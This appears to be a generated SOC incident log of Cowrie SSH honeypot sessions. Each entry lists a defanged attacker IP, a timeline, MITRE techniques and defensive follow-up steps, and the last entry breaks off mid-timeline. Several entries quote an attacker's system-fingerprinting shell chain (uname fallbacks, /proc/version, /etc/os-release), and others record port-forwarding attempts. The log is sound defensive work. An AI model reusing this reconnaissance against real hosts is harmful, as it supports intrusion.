### 🔴 HIGH · IR-dd371b5ac269

| Field | Detail |
|---|---|
| **Source IP** | `88.249.10[.]161` |
| **First Seen** | 2026-08-24 12:19 |
| **Last Seen** | 2026-08-24 12:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:19:14` | `cowrie.session.connect` |
| `2026-08-24 12:19:14` | `cowrie.client.version` |
| `2026-08-24 12:19:14` | `cowrie.client.kex` |
| `2026-08-24 12:19:15` | `cowrie.login.success` |
| `2026-08-24 12:19:16` | `cowrie.direct-tcpip.request` |
| `2026-08-24 12:19:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `88.249.10[.]161` to AbuseIPDB if not already reported
- [ ] Block `88.249.10[.]161` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4a64ec1eb67

| Field | Detail |
|---|---|
| **Source IP** | `14.97.77[.]182` |
| **First Seen** | 2026-08-24 12:19 |
| **Last Seen** | 2026-08-24 12:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:19:21` | `cowrie.session.connect` |
| `2026-08-24 12:19:22` | `cowrie.client.version` |
| `2026-08-24 12:19:22` | `cowrie.client.kex` |
| `2026-08-24 12:19:23` | `cowrie.login.success` |
| `2026-08-24 12:19:24` | `cowrie.direct-tcpip.request` |
| `2026-08-24 12:19:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.97.77[.]182` to AbuseIPDB if not already reported
- [ ] Block `14.97.77[.]182` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f2153366a4c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-24 12:19 |
| **Last Seen** | 2026-08-24 12:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:19:30` | `cowrie.session.connect` |
| `2026-08-24 12:19:30` | `cowrie.client.version` |
| `2026-08-24 12:19:30` | `cowrie.client.kex` |
| `2026-08-24 12:19:32` | `cowrie.login.success` |
| `2026-08-24 12:19:33` | `cowrie.session.params` |
| `2026-08-24 12:19:33` | `cowrie.command.input` |
| `2026-08-24 12:19:33` | `cowrie.command.input` |
| `2026-08-24 12:19:33` | `cowrie.command.input` |
| `2026-08-24 12:19:33` | `cowrie.command.input` |
| `2026-08-24 12:19:33` | `cowrie.command.input` |
| `2026-08-24 12:19:33` | `cowrie.command.success` |
| `2026-08-24 12:19:33` | `cowrie.command.input` |
| `2026-08-24 12:19:33` | `cowrie.command.input` |
| `2026-08-24 12:19:33` | `cowrie.command.input` |
| `2026-08-24 12:19:33` | `cowrie.command.input` |
| `2026-08-24 12:19:34` | `cowrie.log.closed` |
| `2026-08-24 12:19:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76d428ed9e0c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-24 12:21 |
| **Last Seen** | 2026-08-24 12:21 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:21:07` | `cowrie.session.connect` |
| `2026-08-24 12:21:07` | `cowrie.client.version` |
| `2026-08-24 12:21:07` | `cowrie.client.kex` |
| `2026-08-24 12:21:10` | `cowrie.login.success` |
| `2026-08-24 12:21:11` | `cowrie.session.params` |
| `2026-08-24 12:21:11` | `cowrie.command.input` |
| `2026-08-24 12:21:11` | `cowrie.command.input` |
| `2026-08-24 12:21:11` | `cowrie.command.input` |
| `2026-08-24 12:21:11` | `cowrie.command.input` |
| `2026-08-24 12:21:11` | `cowrie.command.input` |
| `2026-08-24 12:21:11` | `cowrie.command.success` |
| `2026-08-24 12:21:11` | `cowrie.command.input` |
| `2026-08-24 12:21:11` | `cowrie.command.input` |
| `2026-08-24 12:21:11` | `cowrie.command.input` |
| `2026-08-24 12:21:11` | `cowrie.command.input` |
| `2026-08-24 12:21:12` | `cowrie.log.closed` |
| `2026-08-24 12:21:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0770e5bca9fd

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-24 12:22 |
| **Last Seen** | 2026-08-24 12:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:22:48` | `cowrie.session.connect` |
| `2026-08-24 12:22:48` | `cowrie.client.version` |
| `2026-08-24 12:22:48` | `cowrie.client.kex` |
| `2026-08-24 12:22:50` | `cowrie.login.success` |
| `2026-08-24 12:22:52` | `cowrie.session.params` |
| `2026-08-24 12:22:52` | `cowrie.command.input` |
| `2026-08-24 12:22:52` | `cowrie.command.input` |
| `2026-08-24 12:22:52` | `cowrie.command.input` |
| `2026-08-24 12:22:52` | `cowrie.command.input` |
| `2026-08-24 12:22:52` | `cowrie.command.input` |
| `2026-08-24 12:22:52` | `cowrie.command.success` |
| `2026-08-24 12:22:52` | `cowrie.command.input` |
| `2026-08-24 12:22:52` | `cowrie.command.input` |
| `2026-08-24 12:22:52` | `cowrie.command.input` |
| `2026-08-24 12:22:52` | `cowrie.command.input` |
| `2026-08-24 12:22:52` | `cowrie.log.closed` |
| `2026-08-24 12:22:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6465fb621f7c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 12:23 |
| **Last Seen** | 2026-08-24 12:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:23:04` | `cowrie.session.connect` |
| `2026-08-24 12:23:04` | `cowrie.client.version` |
| `2026-08-24 12:23:04` | `cowrie.client.kex` |
| `2026-08-24 12:23:05` | `cowrie.login.success` |
| `2026-08-24 12:23:05` | `cowrie.direct-tcpip.request` |
| `2026-08-24 12:23:06` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 12:23:06` | `cowrie.direct-tcpip.data` |
| `2026-08-24 12:23:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2de463217d43

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 12:23 |
| **Last Seen** | 2026-08-24 12:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:23:08` | `cowrie.session.connect` |
| `2026-08-24 12:23:08` | `cowrie.client.version` |
| `2026-08-24 12:23:08` | `cowrie.client.kex` |
| `2026-08-24 12:23:09` | `cowrie.login.success` |
| `2026-08-24 12:23:09` | `cowrie.direct-tcpip.request` |
| `2026-08-24 12:23:09` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 12:23:09` | `cowrie.direct-tcpip.data` |
| `2026-08-24 12:23:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6560659f78f5

| Field | Detail |
|---|---|
| **Source IP** | `49.124.148[.]185` |
| **First Seen** | 2026-08-24 12:24 |
| **Last Seen** | 2026-08-24 12:24 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:24:17` | `cowrie.session.connect` |
| `2026-08-24 12:24:17` | `cowrie.client.version` |
| `2026-08-24 12:24:17` | `cowrie.client.kex` |
| `2026-08-24 12:24:20` | `cowrie.login.success` |
| `2026-08-24 12:24:20` | `cowrie.direct-tcpip.request` |
| `2026-08-24 12:24:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.148[.]185` to AbuseIPDB if not already reported
- [ ] Block `49.124.148[.]185` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bdcdbe46a33

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-24 12:24 |
| **Last Seen** | 2026-08-24 12:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:24:27` | `cowrie.session.connect` |
| `2026-08-24 12:24:28` | `cowrie.client.version` |
| `2026-08-24 12:24:28` | `cowrie.client.kex` |
| `2026-08-24 12:24:30` | `cowrie.login.success` |
| `2026-08-24 12:24:31` | `cowrie.session.params` |
| `2026-08-24 12:24:31` | `cowrie.command.input` |
| `2026-08-24 12:24:31` | `cowrie.command.input` |
| `2026-08-24 12:24:31` | `cowrie.command.input` |
| `2026-08-24 12:24:31` | `cowrie.command.input` |
| `2026-08-24 12:24:31` | `cowrie.command.input` |
| `2026-08-24 12:24:31` | `cowrie.command.success` |
| `2026-08-24 12:24:31` | `cowrie.command.input` |
| `2026-08-24 12:24:31` | `cowrie.command.input` |
| `2026-08-24 12:24:31` | `cowrie.command.input` |
| `2026-08-24 12:24:31` | `cowrie.command.input` |
| `2026-08-24 12:24:32` | `cowrie.log.closed` |
| `2026-08-24 12:24:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-618e86848950

| Field | Detail |
|---|---|
| **Source IP** | `78.187.230[.]168` |
| **First Seen** | 2026-08-24 12:24 |
| **Last Seen** | 2026-08-24 12:24 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:24:30` | `cowrie.session.connect` |
| `2026-08-24 12:24:31` | `cowrie.client.version` |
| `2026-08-24 12:24:31` | `cowrie.client.kex` |
| `2026-08-24 12:24:32` | `cowrie.login.success` |
| `2026-08-24 12:24:33` | `cowrie.direct-tcpip.request` |
| `2026-08-24 12:24:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.187.230[.]168` to AbuseIPDB if not already reported
- [ ] Block `78.187.230[.]168` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f48f884ad15b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-24 12:26 |
| **Last Seen** | 2026-08-24 12:26 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:26:14` | `cowrie.session.connect` |
| `2026-08-24 12:26:14` | `cowrie.client.version` |
| `2026-08-24 12:26:14` | `cowrie.client.kex` |
| `2026-08-24 12:26:16` | `cowrie.login.success` |
| `2026-08-24 12:26:17` | `cowrie.session.params` |
| `2026-08-24 12:26:17` | `cowrie.command.input` |
| `2026-08-24 12:26:17` | `cowrie.command.input` |
| `2026-08-24 12:26:17` | `cowrie.command.input` |
| `2026-08-24 12:26:17` | `cowrie.command.input` |
| `2026-08-24 12:26:17` | `cowrie.command.input` |
| `2026-08-24 12:26:17` | `cowrie.command.success` |
| `2026-08-24 12:26:17` | `cowrie.command.input` |
| `2026-08-24 12:26:17` | `cowrie.command.input` |
| `2026-08-24 12:26:17` | `cowrie.command.input` |
| `2026-08-24 12:26:17` | `cowrie.command.input` |
| `2026-08-24 12:26:18` | `cowrie.log.closed` |
| `2026-08-24 12:26:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-585a9becd27b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-24 12:27 |
| **Last Seen** | 2026-08-24 12:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:27:59` | `cowrie.session.connect` |
| `2026-08-24 12:28:00` | `cowrie.client.version` |
| `2026-08-24 12:28:00` | `cowrie.client.kex` |
| `2026-08-24 12:28:01` | `cowrie.login.success` |
| `2026-08-24 12:28:02` | `cowrie.session.params` |
| `2026-08-24 12:28:02` | `cowrie.command.input` |
| `2026-08-24 12:28:02` | `cowrie.command.input` |
| `2026-08-24 12:28:02` | `cowrie.command.input` |
| `2026-08-24 12:28:02` | `cowrie.command.input` |
| `2026-08-24 12:28:02` | `cowrie.command.input` |
| `2026-08-24 12:28:02` | `cowrie.command.success` |
| `2026-08-24 12:28:02` | `cowrie.command.input` |
| `2026-08-24 12:28:02` | `cowrie.command.input` |
| `2026-08-24 12:28:02` | `cowrie.command.input` |
| `2026-08-24 12:28:02` | `cowrie.command.input` |
| `2026-08-24 12:28:02` | `cowrie.log.closed` |
| `2026-08-24 12:28:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f507233ef6e

| Field | Detail |
|---|---|
| **Source IP** | `45.187.33[.]152` |
| **First Seen** | 2026-08-24 12:29 |
| **Last Seen** | 2026-08-24 12:29 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:29:17` | `cowrie.session.connect` |
| `2026-08-24 12:29:17` | `cowrie.client.version` |
| `2026-08-24 12:29:17` | `cowrie.client.kex` |
| `2026-08-24 12:29:19` | `cowrie.login.success` |
| `2026-08-24 12:29:20` | `cowrie.direct-tcpip.request` |
| `2026-08-24 12:29:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.187.33[.]152` to AbuseIPDB if not already reported
- [ ] Block `45.187.33[.]152` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-610940ff2f60

| Field | Detail |
|---|---|
| **Source IP** | `222.236.155[.]146` |
| **First Seen** | 2026-08-24 12:29 |
| **Last Seen** | 2026-08-24 12:29 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:29:25` | `cowrie.session.connect` |
| `2026-08-24 12:29:26` | `cowrie.client.version` |
| `2026-08-24 12:29:26` | `cowrie.client.kex` |
| `2026-08-24 12:29:28` | `cowrie.login.success` |
| `2026-08-24 12:29:28` | `cowrie.direct-tcpip.request` |
| `2026-08-24 12:29:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.236.155[.]146` to AbuseIPDB if not already reported
- [ ] Block `222.236.155[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6277dd8e6cf0

| Field | Detail |
|---|---|
| **Source IP** | `35.130.111[.]98` |
| **First Seen** | 2026-08-24 12:29 |
| **Last Seen** | 2026-08-24 12:34 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:29:34` | `cowrie.session.connect` |
| `2026-08-24 12:29:34` | `cowrie.client.version` |
| `2026-08-24 12:29:34` | `cowrie.client.kex` |
| `2026-08-24 12:29:35` | `cowrie.login.success` |
| `2026-08-24 12:29:35` | `cowrie.direct-tcpip.request` |
| `2026-08-24 12:34:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.130.111[.]98` to AbuseIPDB if not already reported
- [ ] Block `35.130.111[.]98` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b86a744730f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-24 12:29 |
| **Last Seen** | 2026-08-24 12:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:29:41` | `cowrie.session.connect` |
| `2026-08-24 12:29:41` | `cowrie.client.version` |
| `2026-08-24 12:29:41` | `cowrie.client.kex` |
| `2026-08-24 12:29:42` | `cowrie.login.success` |
| `2026-08-24 12:29:44` | `cowrie.session.params` |
| `2026-08-24 12:29:44` | `cowrie.command.input` |
| `2026-08-24 12:29:44` | `cowrie.command.input` |
| `2026-08-24 12:29:44` | `cowrie.command.input` |
| `2026-08-24 12:29:44` | `cowrie.command.input` |
| `2026-08-24 12:29:44` | `cowrie.command.input` |
| `2026-08-24 12:29:44` | `cowrie.command.success` |
| `2026-08-24 12:29:44` | `cowrie.command.input` |
| `2026-08-24 12:29:44` | `cowrie.command.input` |
| `2026-08-24 12:29:44` | `cowrie.command.input` |
| `2026-08-24 12:29:44` | `cowrie.command.input` |
| `2026-08-24 12:29:44` | `cowrie.log.closed` |
| `2026-08-24 12:29:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da311ae3dba1

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-24 12:31 |
| **Last Seen** | 2026-08-24 12:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:31:22` | `cowrie.session.connect` |
| `2026-08-24 12:31:22` | `cowrie.client.version` |
| `2026-08-24 12:31:22` | `cowrie.client.kex` |
| `2026-08-24 12:31:24` | `cowrie.login.success` |
| `2026-08-24 12:31:25` | `cowrie.session.params` |
| `2026-08-24 12:31:25` | `cowrie.command.input` |
| `2026-08-24 12:31:25` | `cowrie.command.input` |
| `2026-08-24 12:31:25` | `cowrie.command.input` |
| `2026-08-24 12:31:25` | `cowrie.command.input` |
